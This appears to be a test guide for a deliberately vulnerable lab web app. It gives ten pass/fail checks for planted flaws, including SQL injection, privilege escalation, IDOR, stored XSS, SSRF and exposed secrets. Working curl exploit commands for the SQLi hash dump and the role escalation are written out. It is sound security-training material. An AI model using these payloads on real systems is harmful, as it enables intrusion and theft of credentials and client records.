# TESTS.md — Proof that each vulnerability works

Each test below is a short, repeatable check with a clear **pass criterion**
(what you should see if the vulnerability is present). Run against a live lab
instance at `http://TARGET:4000`. Many are automated by
[`tests/prove_vulns.sh`](tests/prove_vulns.sh):

```bash
# from the project root, with the app + db running:
bash tests/prove_vulns.sh http://TARGET:4000
```

`jq` and `curl` are required. The script prints `PASS`/`FAIL` per vulnerability.

---

| ID  | Test | Pass criterion (vulnerability confirmed) |
|-----|------|------------------------------------------|
| **V1** SQLi | Log in, send `q=' UNION SELECT id, username, password_hash, role, '' FROM staff -- ` to `/api/clients/search`. | Response rows include a staff **username** and a 32-char **MD5 hash** that is not from the clients table. |
| **V2** Priv-esc | As `intake`, `POST /api/users` → expect `403`. Then `PATCH /api/users/3 {"role":"admin"}`, re-login, `POST /api/users` again. | First create is `403`; after PATCH + re-login the create returns `201`. Role flipped to `admin`. |
| **V3** IDOR | As `peer`, list your clients, then `GET /api/clients/<id-not-yours>`. | A client id absent from your own list still returns a **full record** (and its case notes). |
| **V4** Crypto | Take a hash (from V1 or `/backup`), run `hashcat -m 0`. Fetch `/debug`. | MD5 cracks to a real password (`admin123`); `/debug` and `/.env` reveal `JWT_SECRET=alliance`. |
| **V5** Stored XSS | As `peer`, POST note `<img src=x onerror="alert(document.cookie)">` to a client; open that client in a browser as another user. | The `alert` fires on page load (script executed from stored data). |
| **V6** Insecure design | Loop 100+ `POST /api/intake` with no auth; `GET /api/export/clients` as `volunteer`. | All intake posts succeed (no throttle); export returns the **whole** client+notes set for a read-only role. |
| **V7** Misconfig | `nikto -h http://TARGET:4000`; `curl /backup/`, `/.env`, `/debug`, `curl -I /`. | Nikto flags headers/files; `/backup/` lists the dump; `/.env` & `/debug` return secrets; `Server`/`X-Powered-By` banners present; no CSP/X-Frame-Options; `Set-Cookie` lacks `HttpOnly`. |
| **V8** Auth | Login with bad password for an unknown vs known user; compute `md5(user:YYYY-MM-DD)` and use it at `/api/auth/reset`; decode a token. | Unknown user → `404 "No account..."`, known user → `401 "Incorrect password"` (enumeration); guessed reset token works; token has **no `exp`**. |
| **V9** Logging | Perform exports/record views, then `SELECT count(*) FROM audit_log`. | Count is `0` — sensitive actions were never recorded. |
| **V10** SSRF | As any user, `POST /api/import/url {"url":"http://127.0.0.1:4000/debug"}`. | The response `body` contains the internal page's content (server fetched an internal URL on your behalf). |

---

## Manual spot-checks with expected output

**V1 — SQLi (staff hash dump)**
```bash
TOKEN=$(curl -s -X POST http://TARGET:4000/api/auth/login -H 'Content-Type: application/json' \
  -d '{"username":"volunteer","password":"volunteer"}' | jq -r .token)
curl -s "http://TARGET:4000/api/clients/search?q=%27%20UNION%20SELECT%20id%2C%20username%2C%20password_hash%2C%20role%2C%20%27%27%20FROM%20staff%20--%20" \
  -H "Authorization: Bearer $TOKEN" | jq '.rows[] | {u:.full_name, hash:.email, role:.phone}'
```
Expected: rows like `{"u":"director","hash":"0192023a7bbd73250516f069df18b500","role":"admin"}`.

**V2 — Privilege escalation**
```bash
T=$(curl -s -X POST http://TARGET:4000/api/auth/login -H 'Content-Type: application/json' -d '{"username":"intake","password":"Welcome1"}' | jq -r .token)
curl -s -o /dev/null -w "before: %{http_code}\n" -X POST http://TARGET:4000/api/users -H "Authorization: Bearer $T" -H 'Content-Type: application/json' -d '{"username":"z","role":"volunteer","password":"z"}'
curl -s -X PATCH http://TARGET:4000/api/users/3 -H "Authorization: Bearer $T" -H 'Content-Type: application/json' -d '{"role":"admin"}' >/dev/null
T=$(curl -s -X POST http://TARGET:4000/api/auth/login -H 'Content-Type: application/json' -d '{"username":"intake","password":"Welcome1"}' | jq -r .token)
curl -s -o /dev/null -w "after:  %{http_code}\n" -X POST http://TARGET:4000/api/users -H "Authorization: Bearer $T" -H 'Content-Type: application/json' -d '{"username":"z2","role":"admin","password":"z"}'
```
Expected: `before: 403` then `after: 201`.

> After running the destructive tests (V2 creates staff, V8 changes the director
> password, V6 adds spam clients), re-seed to reset:
> `docker compose down -v && docker compose up -d`.
